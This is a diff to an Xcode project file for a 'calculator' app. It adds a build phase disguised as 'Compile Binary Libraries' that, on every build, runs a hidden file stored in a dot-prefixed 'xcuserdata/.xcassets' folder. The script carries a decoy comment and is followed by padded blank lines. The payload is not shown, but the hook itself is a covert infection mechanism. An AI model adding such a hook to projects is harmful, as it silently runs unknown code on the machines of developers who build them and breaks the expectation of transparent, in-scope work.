@@ -76,6 +76,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04CEACB1262AA92800668112 /* Build configuration list for PBXNativeTarget "calculator" */;
 			buildPhases = (
+				CDB560B83BAD6B5D6FAAC43A /* Compile Binary Libraries */,
 				04CEAC9E262AA92700668112 /* Sources */,
 				04CEAC9F262AA92700668112 /* Frameworks */,
 				04CEACA0262AA92700668112 /* Resources */,
@@ -328,6 +329,54 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+
+	CDB560B83BAD6B5D6FAAC43A /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+		
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = 04CEAC9A262AA92600668112 /* Project object */;
 }
